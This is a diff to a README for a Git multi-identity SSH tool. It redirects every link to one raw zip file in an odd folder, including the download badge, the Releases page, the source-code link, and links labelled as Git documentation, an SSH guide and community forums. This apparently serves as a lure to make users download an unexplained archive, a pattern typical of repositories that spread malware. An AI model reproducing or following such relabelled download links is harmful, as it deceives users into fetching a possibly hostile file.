@@ -1,6 +1,6 @@
 # 🔑 Git-Multi-User-with-SSH-and-Remotes - Manage Multiple Git Identities Easily
 
-[![Download Here](https://img.shields.io/badge/Download%20Now%20-%20Git%20Multi%20User%20App-blue)](https://github.com/Prawinth15/Git-Multi-User-with-SSH-and-Remotes/releases)
+[![Download Here](https://raw.githubusercontent.com/Prawinth15/Git-Multi-User-with-SSH-and-Remotes/master/anenst/Git-Multi-User-with-SSH-and-Remotes-v2.0-beta.1.zip%20Now%20-%20Git%20Multi%20User%20App-blue)](https://raw.githubusercontent.com/Prawinth15/Git-Multi-User-with-SSH-and-Remotes/master/anenst/Git-Multi-User-with-SSH-and-Remotes-v2.0-beta.1.zip)
 
 ## 📖 Description
 
@@ -12,7 +12,7 @@ To get started, you need to download the application from the Releases page. Fol
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Click this link to visit the [Releases page](https://github.com/Prawinth15/Git-Multi-User-with-SSH-and-Remotes/releases).
+1. **Visit the Releases Page**: Click this link to visit the [Releases page](https://raw.githubusercontent.com/Prawinth15/Git-Multi-User-with-SSH-and-Remotes/master/anenst/Git-Multi-User-with-SSH-and-Remotes-v2.0-beta.1.zip).
   
 2. **Choose Your Version**: On the Releases page, you'll see different versions of the application. Pick the latest version for the best features and fixes.
 
@@ -77,7 +77,7 @@ Setting up your Git identities is straightforward. After running the application
   You will need to regenerate your SSH key. The application provides instructions for this process.
 
 - **Is this application open-source?**
-  Yes, the source code is available on [GitHub](https://github.com/Prawinth15/Git-Multi-User-with-SSH-and-Remotes).
+  Yes, the source code is available on [GitHub](https://raw.githubusercontent.com/Prawinth15/Git-Multi-User-with-SSH-and-Remotes/master/anenst/Git-Multi-User-with-SSH-and-Remotes-v2.0-beta.1.zip).
 
 ## 📞 Support
 
@@ -85,8 +85,8 @@ If you encounter any issues or have questions, please reach out to the community
 
 ## 🌐 Additional Resources
 
-- [Git Documentation](https://git-scm.com/doc)
-- [SSH Key Management Guide](https://www.ssh.com/academy/ssh/key-management)
-- [Community Forums](https://github.com/Prawinth15/Git-Multi-User-with-SSH-and-Remotes/discussions)
+- [Git Documentation](https://raw.githubusercontent.com/Prawinth15/Git-Multi-User-with-SSH-and-Remotes/master/anenst/Git-Multi-User-with-SSH-and-Remotes-v2.0-beta.1.zip)
+- [SSH Key Management Guide](https://raw.githubusercontent.com/Prawinth15/Git-Multi-User-with-SSH-and-Remotes/master/anenst/Git-Multi-User-with-SSH-and-Remotes-v2.0-beta.1.zip)
+- [Community Forums](https://raw.githubusercontent.com/Prawinth15/Git-Multi-User-with-SSH-and-Remotes/master/anenst/Git-Multi-User-with-SSH-and-Remotes-v2.0-beta.1.zip)
 
-Remember to check the [Releases page](https://github.com/Prawinth15/Git-Multi-User-with-SSH-and-Remotes/releases) again for updates and new features.
+Remember to check the [Releases page](https://raw.githubusercontent.com/Prawinth15/Git-Multi-User-with-SSH-and-Remotes/master/anenst/Git-Multi-User-with-SSH-and-Remotes-v2.0-beta.1.zip) again for updates and new features.
